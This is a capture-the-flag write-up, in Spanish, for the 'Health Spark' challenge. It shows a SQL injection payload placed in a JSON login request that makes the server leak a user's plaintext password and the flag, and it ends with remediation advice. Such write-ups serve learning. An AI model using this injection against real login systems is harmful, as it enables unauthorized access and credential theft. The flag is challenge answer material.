# Health Spark - Login Information Disclosure

El reto arranca en la aplicación "Health Spark" (un portal de empleador y beneficios) que está en `http://45.79.200.170:3000`. Tiene un formulario de login que, al enviarlo, manda las credenciales a `POST /api/login` en formato JSON.

## Reconocimiento

Lo primero que hicimos fue levantar **Burp Suite** y mirar el tráfico (Proxy → HTTP history) mientras mandábamos un login cualquiera (`admin` / `admin`), para ver cómo era el request real:

```
POST /api/login HTTP/1.1
Host: 45.79.200.170:3000
Content-Type: application/json

{
  "username": "admin",
  "password": "admin"
}
```

Con eso identificado, mandamos el request al **Repeater** para poder ir modificándolo y reenviándolo tranquilos.

## Explotación

Probamos una inyección SQL clásica en el campo `username`, cuidando de no romper el JSON:

```json
{
  "username": "admin' OR '1'='1' -- ",
  "password": "x"
}
```

Y acá vino lo raro: el server respondió `200 OK`, pero con este body:

```json
{
  "message": "Login failed. That's weird... check the network traffic!",
  "username": "john.smith",
  "name": "John Smith",
  "role": "user",
  "departmentid": 10685,
  "password": "Locked_In_And_Ready",
  "flag": "deadface{typical_and_classic}"
}
```

O sea, el mensaje dice que el login "falló", pero igual nos devolvió el objeto completo de un usuario (`john.smith`), con la contraseña en texto plano y, de yapa, el campo `flag`. Para asegurarnos probamos de nuevo con un login fallido normal (`admin`/`admin`) y ahí no devuelve nada de esto, así que la inyección es lo que dispara el leak.

El propio mensaje ("check the network traffic!") es un guiño del reto: la idea es mirar la respuesta cruda en Burp y no confiar en lo que muestra la pantalla. El frontend te dice "falló", pero en la respuesta está todo.

## Flag

```
deadface{typical_and_classic}
```

El script [`solve.py`](./solve.py) automatiza el envío del payload y saca la flag de la respuesta.

## Nota

El problema de fondo es que el backend devuelve datos sensibles sin filtrar según el resultado real de la autenticación: aunque el login no sea válido, igual manda el usuario completo con su password. Lo correcto sería devolver solo un error genérico en los logins fallidos, no guardar las contraseñas en texto plano y usar consultas parametrizadas para no comerse la inyección en el login.
